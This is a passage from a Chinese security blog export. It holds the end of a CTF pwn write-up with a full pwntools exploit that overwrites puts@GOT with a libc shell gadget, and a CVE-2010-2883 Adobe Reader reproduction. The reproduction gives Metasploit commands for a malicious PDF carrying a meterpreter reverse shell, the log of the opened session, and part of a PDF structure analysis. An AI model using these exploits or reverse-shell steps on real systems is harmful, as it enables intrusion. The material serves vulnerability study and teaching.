class="built_in">printf</span>(<span class="string">"OK, what would you like to modify %s to?\n"</span>, *goods_list[goods_num], goods_num);<span class="comment">// 这里可以用来泄露地址</span></span><br><span class="line">  *(*goods_list[v1] + read(<span class="number">0</span>, *goods_list[v1], <span class="number">8u</span>LL)) = <span class="number">0</span>;<span class="comment">// 这里会造成任意地址写</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数中没有对输入的数据进行验证，当我们修改goods参数时，输入的goods编号为负数时，经过strtoul转换后，会造成后面打印的时候，越界读取数组，泄露地址信息。修改数据的时候会造成任意地址写。我们再来看看.bss段上数据的排布：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202090 goods_sum       dq ?                    ; DATA XREF: add_goods+17↑r</span><br><span class="line">.bss:0000000000202090                                         ; add_goods+E1↑r ...</span><br><span class="line">.bss:0000000000202098 money_sum       dq ?                    ; DATA XREF: getmoney+8↑r</span><br><span class="line">.bss:0000000000202098                                         ; getmoney+53↑r ...</span><br><span class="line">.bss:00000000002020A0 ; char money_type[160]</span><br><span class="line">.bss:00000000002020A0 money_type      db 0A0h dup(?)          ; 0</span><br><span class="line">.bss:00000000002020A0                                         ; DATA XREF: getmoney+62↑o</span><br><span class="line">.bss:00000000002020A0                                         ; getmoney+8B↑o</span><br><span class="line">.bss:0000000000202140 money_list      dq 14h dup(?)           ; 0</span><br><span class="line">.bss:0000000000202140                                         ; DATA XREF: getmoney+B6↑o</span><br><span class="line">.bss:00000000002021E0 ; _QWORD goods_list[20]</span><br><span class="line">.bss:00000000002021E0 goods_list      dq 14h dup(?)           ; 0</span><br><span class="line">.bss:00000000002021E0                                         ; DATA XREF: add_goods+FB↑o</span><br><span class="line">.bss:00000000002021E0                                         ; delete_check+24↑o ...</span><br></pre></td></tr></table></figure><p>可以看到money_type、money_list、goods_list都是相连的，通过对goods_list的越界读取，可以泄露出程序的某一处地址。说来也巧，刚好在其上面不远处有一个指向自身的指针，我们可以计算偏移，泄露出此处的地址，计算出elf文件的加载基址。这处地址在elf文件的偏移0x202068处。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202068</span> off_202068      <span class="built_in">dq</span> offset off_202068    <span class="comment">; DATA XREF: sub_940+17↑r</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202068</span>                                         <span class="comment">; .data:off_202068↓o</span></span><br></pre></td></tr></table></figure><h4 id="0x03-exp-non-heap"><a href="#0x03-exp-non-heap" class="headerlink" title="0x03 exp(non-heap)"></a>0x03 exp(non-heap)</h4><p>利用思路：</p><blockquote><p>1、调用getmoney()获得money，这里可以只获得两个money，因为后面只用到了money_list的前两个，也可以添加满20个。<br>2、利用edit_goods()泄露elf偏移0x202068处的地址，并计算出elf文件的加载基址，再计算出puts_got的地址。这里为什么不能直接泄露got表函数的地址，后面再说。<br>3、修改money_list[0]中的指针为money_list[1]的地址，修改money_list[1]中的指针为puts_got的地址。这里是为了泄露puts函数地址并且修改got表。因为修改goods_name的时候，是一个二级指针结构，所以这里也需要构造成一个二级指针结构。<br>4、然后将libc中的execv(“/bin/sh”)片段地址覆盖puts_got地址，再次调用puts()时，就会执行execv(“/bin/sh”)。</p></blockquote><p>第二步为什么不能直接泄露puts_got的内容，就是因为第三步中所说的，泄漏的内容需要具有一个二级指针结构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./shoppingCart'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmoney</span><span class="params">(io,num)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        io.sendlineafter(<span class="string">'EMMmmm, you will be a rich man!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">'RMB or Dollar?\n'</span>,<span class="string">'RMB'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'EMMmmm, you will be a rich man!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_goods</span><span class="params">(io,index,content,flag)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Now, buy buy buy!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'Which goods you need to modify?\n'</span>,index)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'OK, what would you like to modify '</span>)</span><br><span class="line">        addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'./shoppingCart'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">getmoney(io,<span class="number">0x14</span>)</span><br><span class="line">addr = edit_goods(io,<span class="string">'-47'</span>,<span class="string">''</span>,<span class="number">1</span>)</span><br><span class="line">elf_base = addr - <span class="number">0x202068</span></span><br><span class="line"></span><br><span class="line">io.sendline(p64(addr))</span><br><span class="line">puts_got = elf_base + <span class="number">0x202020</span></span><br><span class="line">money_name1 = elf_base + <span class="number">0x2020a8</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">edit_goods(io,<span class="string">'-0x14'</span>,p64(money_name1),<span class="number">0</span>)  <span class="comment">#money_name[0]-&gt;money_name[1]</span></span><br><span class="line">edit_goods(io,<span class="string">'-0x13'</span>,p64(puts_got),<span class="number">0</span>)   <span class="comment">#money_name[1]=puts_got</span></span><br><span class="line"></span><br><span class="line">puts_addr = edit_goods(io,<span class="string">'-0x28'</span>,<span class="string">''</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">shell = p64(libc_base + <span class="number">0x45216</span>)</span><br><span class="line">io.send(shell)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://laucyun.com/3411bc6f400207178b85defa04474b4a.html#directory-0146717171785671911" target="_blank" rel="noopener">https://laucyun.com/3411bc6f400207178b85defa04474b4a.html#directory-0146717171785671911</a><br><a href="https://xz.aliyun.com/t/2897#" target="_blank" rel="noopener">https://xz.aliyun.com/t/2897#</a><br><a href="https://veritas501.space/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AF%20pwn%20wp/" target="_blank" rel="noopener">https://veritas501.space/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AF%20pwn%20wp/</a></p><p><a href="https://blog.csdn.net/w12315q/article/details/83119560" target="_blank" rel="noopener">https://blog.csdn.net/w12315q/article/details/83119560</a><br><a href="http://m4x.fun/post/hwb2018-pwn-writeup/" target="_blank" rel="noopener">http://m4x.fun/post/hwb2018-pwn-writeup/</a><br><a href="https://www.jianshu.com/p/9375c32b2159" target="_blank" rel="noopener">https://www.jianshu.com/p/9375c32b2159</a></p><p><a href="https://www.freebuf.com/articles/rookie/155971.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/rookie/155971.html</a><br><a href="http://p4nda.top/2018/10/14/hwb-ctf-2018/" target="_blank" rel="noopener">http://p4nda.top/2018/10/14/hwb-ctf-2018/</a><br><a href="https://blog.csdn.net/qq_38204481/article/details/83216384" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/83216384</a><br><a href="http://transparentsite.top/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn-shoppingcart/" target="_blank" rel="noopener">http://transparentsite.top/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn-shoppingcart/</a><br><a href="https://www.jianshu.com/p/b96e90ff6f72" target="_blank" rel="noopener">https://www.jianshu.com/p/b96e90ff6f72</a><br><a href="https://waterdrop-team.github.io/2018/10/13/hwb-2018-writeup/" target="_blank" rel="noopener">https://waterdrop-team.github.io/2018/10/13/hwb-2018-writeup/</a><br><a href="http://blog.leanote.com/cate/xp0int/%E6%8A%A4%E7%BD%91%E6%9D%AF2018" target="_blank" rel="noopener">http://blog.leanote.com/cate/xp0int/%E6%8A%A4%E7%BD%91%E6%9D%AF2018</a></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2010-2883复现与分析</title>
      <link href="/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>1、这个漏洞是《漏洞战争》中的例子，也要学着去分析分析实际的漏洞了。<br>2、CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。<br>3、用户受骗打开了特制的PDF文件就有可能导致执行任意代码。</p><ul><li>更新：2020.10.6,也算是重新分析了一遍吧,又收获了很多。这次分析,主要修正了第一次分析中的错误和不足。文章结构有较大变化。更新了动态调试部分，漏洞利用触发的具体原因，以及漏洞利用的具体细节。</li></ul><a id="more"></a></blockquote><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<strong><code>Adobe Reader</code></strong>和<strong><code>Acrobat</code></strong>都是美国奥多比（Adobe）公司的产品。Adobe Reader是一款免费的<code>PDF文件阅读器</code>，Acrobat是一款<code>PDF文件编辑和转换工具</code>。基于<strong><code>Window</code></strong>和<strong><code>Mac OS X</code></strong>的Adobe Reader和Acrobat <code>9.4之前</code>的9.x版本，<code>8.2.5之前</code>的8.x版本的<code>CoolType.dll</code>中存在<code>基于栈的缓冲区溢出漏洞</code>。远程攻击者可借助带有<code>TTF字体</code>Smart INdependent Glyphlets (<code>SING</code>)表格中超长字段<code>uniqueName</code>的PDF文件<code>执行任意代码</code>或者导致<code>拒绝服务</code>（应用程序崩溃）。</p><h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:left">使用的环境</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:center">操作系统</td><td style="text-align:left">Windows XP Professional SP3</td><td style="text-align:left">简体中文版</td></tr><tr><td style="text-align:center">虚拟机</td><td style="text-align:left">VMware Workstation Pro</td><td style="text-align:left">版本号:12.5.8</td></tr><tr><td style="text-align:center">调试器</td><td style="text-align:left">OllyDbg</td><td style="text-align:left">吾爱破解OllyDbg</td></tr><tr><td style="text-align:center">反汇编器</td><td style="text-align:left">IDA Pro</td><td style="text-align:left">版本号:7.0</td></tr><tr><td style="text-align:center">漏洞软件</td><td style="text-align:left">Adobe Reader</td><td style="text-align:left">版本号:9.3.4</td></tr></tbody></table><h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><p>这里用<code>msf</code>来生成用于漏洞利用的<code>exploit样本</code>文件。</p><h3 id="0x21-生成exploit样本文件"><a href="#0x21-生成exploit样本文件" class="headerlink" title="0x21 生成exploit样本文件"></a>0x21 生成exploit样本文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1、弹出计算器</span><br><span class="line">msf &gt; search cve-2010-2883</span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> FILENAME CVE-2010-2883(calc).pdf</span><br><span class="line">FILENAME =&gt; CVE-2010-2883(calc).pdf</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-2883(calc).pdf'</span> file...</span><br><span class="line">[+] CVE-2010-2883(calc).pdf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-2883(calc).pdf</span><br><span class="line"></span><br><span class="line">2、反弹Shell</span><br><span class="line">msf &gt; search cve-2010-2883</span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> FILENAME CVE-2010-2883(shell).pdf</span><br><span class="line">FILENAME =&gt; CVE-2010-2883.pdf</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> LHOST 192.168.50.131</span><br><span class="line">LHOST =&gt; 192.168.50.131</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-2883(shell).pdf'</span> file...</span><br><span class="line">[+] CVE-2010-2883(shell).pdf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-2883(shell).pdf</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;执行完上面的命令可以在<code>/root/.msf4/local/</code>下找到用于exploit的样本文件。然后将样本文件复制到目标主机中。再在<code>kali</code>下进行监听，在windows XP SP3下通过Adobe Reader打开CVE-2010-2883(shell).pdf,获得<code>meterpreter session</code>,从而获得shell。</p><h3 id="0x22-反弹shell"><a href="#0x22-反弹shell" class="headerlink" title="0x22 反弹shell"></a>0x22 反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; back</span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.50.131</span><br><span class="line">LHOST =&gt; 192.168.50.131</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.50.131:4444 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.50.130</span><br><span class="line">[*] Meterpreter session 7 opened (192.168.50.131:4444 -&gt; 192.168.50.130:1074) at 2018-09-17 16:42:44 +0800</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3156 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [版本 5.1.2600]</span><br><span class="line">(C) 版权所有 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\*******\桌面&gt;</span><br></pre></td></tr></table></figure><h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-PDF文件格式"><a href="#0x31-PDF文件格式" class="headerlink" title="0x31 PDF文件格式"></a>0x31 PDF文件格式</h3><p>&emsp;&emsp;<code>可移植文档格式</code>（Portable Document Format，简称PDF）是一种用独立于应用程序、硬件、操作系统的方式呈现文档的文件格式。1991年，Adobe Systems共同创始人<code>约翰·沃诺克</code>提出的名为<code>“Camelot”</code>的系统演变成<code>PDF</code>。PDF文件格式可以将文字、字型、格式、颜色及独立于设备和分辨率的图形图像等封装在一个文件中。该格式文件还可以包含超文本链接、声音和动态影像等电子信息，支持特长文件，集成度和安全可靠性都较高。而且这种格式是<code>跨平台</code>的，和操作系统无关。<br>&emsp;&emsp;PDF文档是一种<code>文本</code>和<code>二进制</code>混排的格式，它由以下<strong><code>四部分组成</code></strong>：</p><blockquote><ul><li><strong><code>header</code></strong>：头部，PDF文件的第一行，用以标识PDF文档的版本。通常格式为%PDF-x.y,PDF版本历经了1.0、1.1、1.2、1.3、1.4、1.5、1.6、1.7、2.0多个版本。</li><li><strong><code>body</code></strong>：PDF的主体部分，包含PDF文档的主题内容，各部分以对象的方式呈现。</li><li><strong><code>xref table</code></strong>：交叉引用表，通过交叉引用表可以快速的找到PDF文档中的各对象。每一个对象在交叉引用表中占据一项。</li><li><strong><code>trailer</code></strong>：PDF文档尾，包含交叉引用的摘要和交叉引用表的起始位置。</li></ul></blockquote><p>&emsp;&emsp;PDF文档中包含<code>字体对象</code>，而本篇文章所讲述的漏洞就是发生在PDF阅读器对于字体解析过程中，未对字体对象中所包含的<code>SING表</code>的<code>uniqueName字段</code>进行长度校验，导致了<code>栈溢出</code>漏洞的发生。下面是我通过<code>PdfStreamDumper</code>读出来的一些PDF的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.5    //此PDF文档符合PDF1.5规范</span><br><span class="line">%84 DA C7 95    </span><br><span class="line"></span><br><span class="line">1 0 obj     //对象1</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Pages 2 0 R        </span><br><span class="line">    /Type /Catalog      //此对象是catalog对象</span><br><span class="line">    /OpenAction 11 0 R  //对象11包含打开PDF时要执行的操作</span><br><span class="line">    /AcroForm 13 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /MediaBox 3 0 R     //对象3包含页面显示的大小</span><br><span class="line">    /Resources 4 0 R    //对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    /Kids [5 0 R]       //此对象的孩子为对象5</span><br><span class="line">    /Count 1            //此PDF总共有1页</span><br><span class="line">    /Type /Pages        //此对象是Pages对象</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">3 0 obj</span><br><span class="line">    [0 0 595 842]</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">4 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Font 6 0 R         //对象6包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Parent 2 0 R       //此对象的父对象是2</span><br><span class="line">    /MediaBox 3 0 R     //对象3包含页面显示的大小</span><br><span class="line">    /Resources 4 0 R    //对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    /Contents [8 0 R]   //对象8是内容对象</span><br><span class="line">    /Type /Page         //此对象的类型是Page</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">6 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /F1 7 0 R           //对象7包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">7 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Font         //字体对象</span><br><span class="line">    /Subtype /TrueType  //字体类型是TrueType</span><br><span class="line">    /Name /F1</span><br><span class="line">    /BaseFont /Cinema   //基于Cinema字体</span><br><span class="line">    /Widths []</span><br><span class="line">    /FontDescriptor 9 0 R   //对象9是字体描述对象</span><br><span class="line">    /Encoding /MacRomanEncoding     //字符编码采用MacRoman</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">8 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 65</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    0 g</span><br><span class="line">    BT</span><br><span class="line">    /F1 32 Tf</span><br><span class="line">    32 Tc</span><br><span class="line">    1 0 0 1 32 773.872 Tm</span><br><span class="line">    (Hello World!) Tj</span><br><span class="line">    ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">9 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /FontDescriptor            //此对象为字体描述对象</span><br><span class="line">    /FontName /Cinema                //字体名称是Cinema</span><br><span class="line">    /Flags 131140</span><br><span class="line">    /FontBBox [-177 -269 1123 866]</span><br><span class="line">    /FontFile2 10 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">10 0 obj    //字体文件</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 40238</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 65932</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">                            表目录头</span><br><span class="line">              |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|</span><br><span class="line">    00000000: 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  ............OS/2 --+</span><br><span class="line">    00000010: B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  